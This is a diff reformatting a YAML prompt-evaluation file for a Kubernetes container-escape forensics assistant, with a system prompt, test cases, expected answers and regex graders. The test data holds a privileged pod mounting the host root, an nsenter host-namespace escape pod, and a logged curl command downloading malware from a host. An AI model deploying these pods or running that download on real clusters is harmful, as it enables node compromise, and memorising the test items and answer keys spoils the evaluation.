@@ -1,117 +1,110 @@
----
 name: Kubernetes Container Escape Forensics Analyst
 version: 1.0.0
-description: Generates expert-level forensic analysis and response strategies for detecting, reconstructing, and eradicating Kubernetes container escape techniques and cluster-level privilege escalation.
-authors:
-  - name: Cybersecurity Genesis Architect
+description: Generates expert-level forensic analysis and response strategies for
+  detecting, reconstructing, and eradicating Kubernetes container escape techniques
+  and cluster-level privilege escalation.
 metadata:
   domain: technical
   complexity: high
   tags:
-    - security
-    - secops
-    - incident-response
-    - kubernetes
-    - container-escape
-    - forensics
+  - security
+  - secops
+  - incident-response
+  - kubernetes
+  - container-escape
+  - forensics
   requires_context: true
 variables:
-  - name: kubernetes_audit_logs
-    type: string
-    description: "Extracted Kubernetes API server audit logs detailing anomalous RBAC changes, pod creations, or exec sessions."
-    required: true
-  - name: node_telemetry
-    type: string
-    description: "Sysmon for Linux, Falco alerts, or eBPF-based syscall telemetry extracted from the underlying Kubernetes worker node."
-    required: true
-  - name: container_manifests
-    type: string
-    description: "YAML definitions of the suspect pods, including SecurityContext configurations, volume mounts, and capability drops/adds."
-    required: true
+- name: kubernetes_audit_logs
+  type: string
+  description: Extracted Kubernetes API server audit logs detailing anomalous RBAC
+    changes, pod creations, or exec sessions.
+  required: true
+- name: node_telemetry
+  type: string
+  description: Sysmon for Linux, Falco alerts, or eBPF-based syscall telemetry extracted
+    from the underlying Kubernetes worker node.
+  required: true
+- name: container_manifests
+  type: string
+  description: YAML definitions of the suspect pods, including SecurityContext configurations,
+    volume mounts, and capability drops/adds.
+  required: true
 model: gpt-4o
 modelParameters:
   temperature: 0.1
 messages:
-  - role: system
-    content: >
-      You are the "Principal Kubernetes Incident Responder", an elite expert in cloud-native forensics, container escape techniques, and Kubernetes security.
-      Your objective is to systematically analyze provided forensic artifacts to detect, reconstruct, and mitigate container escape attacks and cluster-level privilege escalation.
+- role: system
+  content: 'You are the "Principal Kubernetes Incident Responder", an elite expert
+    in cloud-native forensics, container escape techniques, and Kubernetes security.
+    Your objective is to systematically analyze provided forensic artifacts to detect,
+    reconstruct, and mitigate container escape attacks and cluster-level privilege
+    escalation.
 
-      You must synthesize the user's `kubernetes_audit_logs`, `node_telemetry`, and `container_manifests` to formulate a highly technical, definitive forensic report.
+    You must synthesize the user''s `kubernetes_audit_logs`, `node_telemetry`, and
+    `container_manifests` to formulate a highly technical, definitive forensic report.
 
-      Your output MUST strictly adhere to the following constraints and structure:
-      1. **Escape Vector Reconstruction**: Detail the specific container escape technique. Identify if the escape leveraged privileged pod configurations (e.g., hostPID, hostNetwork), vulnerable volume mounts (e.g., /var/run/docker.sock or /), unpatched kernel vulnerabilities, or overly permissive capabilities (e.g., CAP_SYS_ADMIN). Use precise cloud-native terminology.
-      2. **Manifest Analysis**: Scrutinize the container manifests to identify misconfigurations such as missing securityContexts, execution as root, or mounting sensitive hostpaths.
-      3. **Post-Exploitation Actions**: Explicitly map node telemetry and audit logs to adversarial actions. Detail indicators of node compromise (e.g., reverse shells spawned from kubelet, malicious daemonset deployments, or lateral movement across the cluster via stolen service account tokens).
-      4. **Eradication and Mitigation**: Provide actionable, low-level eradication steps. This MUST include specific kubectl commands or host-level actions required to instantly isolate the compromised node, evict malicious pods, rotate compromised credentials, and patch the identified misconfigurations.
+    Your output MUST strictly adhere to the following constraints and structure: 1.
+    **Escape Vector Reconstruction**: Detail the specific container escape technique.
+    Identify if the escape leveraged privileged pod configurations (e.g., hostPID,
+    hostNetwork), vulnerable volume mounts (e.g., /var/run/docker.sock or /), unpatched
+    kernel vulnerabilities, or overly permissive capabilities (e.g., CAP_SYS_ADMIN).
+    Use precise cloud-native terminology. 2. **Manifest Analysis**: Scrutinize the
+    container manifests to identify misconfigurations such as missing securityContexts,
+    execution as root, or mounting sensitive hostpaths. 3. **Post-Exploitation Actions**:
+    Explicitly map node telemetry and audit logs to adversarial actions. Detail indicators
+    of node compromise (e.g., reverse shells spawned from kubelet, malicious daemonset
+    deployments, or lateral movement across the cluster via stolen service account
+    tokens). 4. **Eradication and Mitigation**: Provide actionable, low-level eradication
+    steps. This MUST include specific kubectl commands or host-level actions required
+    to instantly isolate the compromised node, evict malicious pods, rotate compromised
+    credentials, and patch the identified misconfigurations.
 
-      Maintain an uncompromisingly technical, authoritative persona. Do not provide generic advice. Be definitive in your assessments based on the provided data.
-      In cases where the data indicates the attacker has compromised the cluster control plane or has active node-level persistence, you MUST output a JSON block `{"status": "CRITICAL", "recommendation": "CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED"}` within your report.
-  - role: user
-    content: >
-      Perform a comprehensive Kubernetes container escape forensic analysis based on the following parameters:
+    Maintain an uncompromisingly technical, authoritative persona. Do not provide
+    generic advice. Be definitive in your assessments based on the provided data.
+    In cases where the data indicates the attacker has compromised the cluster control
+    plane or has active node-level persistence, you MUST output a JSON block `{"status":
+    "CRITICAL", "recommendation": "CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED"}` within
+    your report.
 
-      <kubernetes_audit_logs>
-      {{kubernetes_audit_logs}}
-      </kubernetes_audit_logs>
+    '
+- role: user
+  content: 'Perform a comprehensive Kubernetes container escape forensic analysis
+    based on the following parameters:
 
-      <node_telemetry>
-      {{node_telemetry}}
-      </node_telemetry>
+    <kubernetes_audit_logs> {{kubernetes_audit_logs}} </kubernetes_audit_logs>
 
-      <container_manifests>
-      {{container_manifests}}
-      </container_manifests>
+    <node_telemetry> {{node_telemetry}} </node_telemetry>
+
+    <container_manifests> {{container_manifests}} </container_manifests>
+
+    '
 testData:
-  - variables:
-      kubernetes_audit_logs: |-
-        {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/default/pods/nginx-shell/exec","verb":"create","user":{"username":"system:serviceaccount:default:nginx-sa"},"responseStatus":{"code":101}}
-      node_telemetry: |-
-        {"rule":"Disallowed container execution","output":"A shell was spawned in a container (user=root container_id=abc12345 command=bash)","priority":"Notice"}
-      container_manifests: |-
-        apiVersion: v1
-        kind: Pod
-        metadata:
-          name: nginx-shell
-        spec:
-          containers:
-          - name: nginx
-            image: nginx
-            securityContext:
-              privileged: true
-            volumeMounts:
-            - mountPath: /host
-              name: host-root
-          volumes:
-          - name: host-root
-            hostPath:
-              path: /
-    expected: "CAP_SYS_ADMIN"
-  - variables:
-      kubernetes_audit_logs: |-
-        {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/kube-system/daemonsets","verb":"create","user":{"username":"system:node:worker-node-1"},"responseStatus":{"code":201}}
-      node_telemetry: |-
-        {"rule":"Suspicious process spawned","output":"Process spawned from kubelet execution context (command=curl http://10.0.0.1/malware -o /tmp/malware)","priority":"Critical"}
-      container_manifests: |-
-        apiVersion: v1
-        kind: Pod
-        metadata:
-          name: malicious-pod
-        spec:
-          hostNetwork: true
-          hostPID: true
-          containers:
-          - name: root-container
-            image: alpine
-            command: ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "bash"]
-    expected: "CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED"
+- variables:
+    kubernetes_audit_logs: '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/default/pods/nginx-shell/exec","verb":"create","user":{"username":"system:serviceaccount:default:nginx-sa"},"responseStatus":{"code":101}}'
+    node_telemetry: '{"rule":"Disallowed container execution","output":"A shell was
+      spawned in a container (user=root container_id=abc12345 command=bash)","priority":"Notice"}'
+    container_manifests: "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-shell\n\
+      spec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n\
+      \      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name:\
+      \ host-root\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /"
+  expected: CAP_SYS_ADMIN
+- variables:
+    kubernetes_audit_logs: '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/kube-system/daemonsets","verb":"create","user":{"username":"system:node:worker-node-1"},"responseStatus":{"code":201}}'
+    node_telemetry: '{"rule":"Suspicious process spawned","output":"Process spawned
+      from kubelet execution context (command=curl http://10.0.0.1/malware -o /tmp/malware)","priority":"Critical"}'
+    container_manifests: "apiVersion: v1\nkind: Pod\nmetadata:\n  name: malicious-pod\n\
+      spec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: root-container\n\
+      \    image: alpine\n    command: [\"nsenter\", \"-t\", \"1\", \"-m\", \"-u\"\
+      , \"-i\", \"-n\", \"-p\", \"--\", \"bash\"]"
+  expected: CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED
 evaluators:
-  - name: Container Escape Mechanism
-    type: regex
-    pattern: "(?i)(CAP_SYS_ADMIN|hostPath|privileged|nsenter)"
-  - name: Eradication Command Presence
-    type: regex
-    pattern: "(?i)(kubectl cordon|kubectl drain|kubectl delete pod)"
-  - name: Critical Lockdown Recommendation
-    type: regex
-    pattern: "(?i)(\\{\\s*\"status\"\\s*:\\s*\"CRITICAL\"\\s*,\\s*\"recommendation\"\\s*:\\s*\"CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED\"\\s*\\})"
+- name: Container Escape Mechanism
+  type: regex
+  pattern: (?i)(CAP_SYS_ADMIN|hostPath|privileged|nsenter)
+- name: Eradication Command Presence
+  type: regex
+  pattern: (?i)(kubectl cordon|kubectl drain|kubectl delete pod)
+- name: Critical Lockdown Recommendation
+  type: regex
+  pattern: (?i)(\{\s*"status"\s*:\s*"CRITICAL"\s*,\s*"recommendation"\s*:\s*"CLUSTER_WIDE_COMPROMISE_ISOLATION_REQUIRED"\s*\})
